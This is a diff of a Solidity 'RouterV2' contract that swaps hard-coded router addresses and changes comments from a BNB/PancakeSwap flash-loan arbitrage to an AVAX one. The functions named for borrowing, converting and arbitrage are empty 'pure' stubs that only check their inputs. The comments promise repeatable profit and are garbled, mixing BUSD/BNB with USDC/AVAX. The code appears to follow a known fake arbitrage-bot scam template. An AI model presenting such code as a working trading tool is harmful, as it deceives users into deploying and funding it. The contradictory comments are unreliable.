@@ -111,7 +111,7 @@ interface pangolinSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x4bfdBF63b3b7F0E0b8bb6bA0CBa0D2d9b9A82345;
+        return 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -123,10 +123,10 @@ contract RouterV2 {
     }
 
     function pangolinSwapAddress() public pure returns (address) {
-        return 0x4bfdBF63b3b7F0E0b8bb6bA0CBa0D2d9b9A82345;
+        return 0x9f16e2970195B01Ee14AAe9B52d9fB314F5C1F4a;
     }
 
-    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+    //1. A flash loan borrowed 3,137.41 AVAX from Multiplier-Finance to make an arbitrage trade on the AMM DEX AVAXSwap.
     function borrowFlashloanFromMultiplier(
         address add0,
         address add1,
@@ -137,17 +137,17 @@ contract RouterV2 {
         require(amount > 0, "Amount should be greater than 0.");
     }
 
-    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+    //To prepare the arbitrage, AVAX is converted to USDC using AVAXSwap swap contract.
     function convertAvaxTo(address add0, uint256 amount) public pure {
         require(uint(add0) != 0, "Address is invalid");
         require(amount > 0, "Amount should be greater than 0");
     }
 
     function avaxSwapAddress() public pure returns (address) {
-        return 0x9f16e2970195B01Ee14AAe9B52d9fB314F5C1F4a;
+        return 0x1b19a3eC9D6D381Ca4F3AF3725EB2F35ad7d359F;
     }
 
-    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+    //The arbitrage converts BUSD for BNB using USDC/AVAX AvaxSwap, and then immediately converts AVAX back to 3,148.39 AVAX using BNB/BUSD BakerySwap.
     function callArbitragePangolin(address add0, address add1) public pure {
         require(uint(add0) != 0, "Address is invalid!");
         require(uint(add1) != 0, "Address is invalid!");
@@ -160,7 +160,7 @@ contract RouterV2 {
         require(uint(add0) != 0, "Address is invalid!");
     }
 
-    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+    //5. Note that the transaction sender gains 3.29 AVAX from the arbitrage, this particular transaction can be repeated as price changes all the time.
     function completeTransation(uint256 balanceAmount) public pure {
         require(balanceAmount >= 0, "Amount should be greater than 0!");
     }
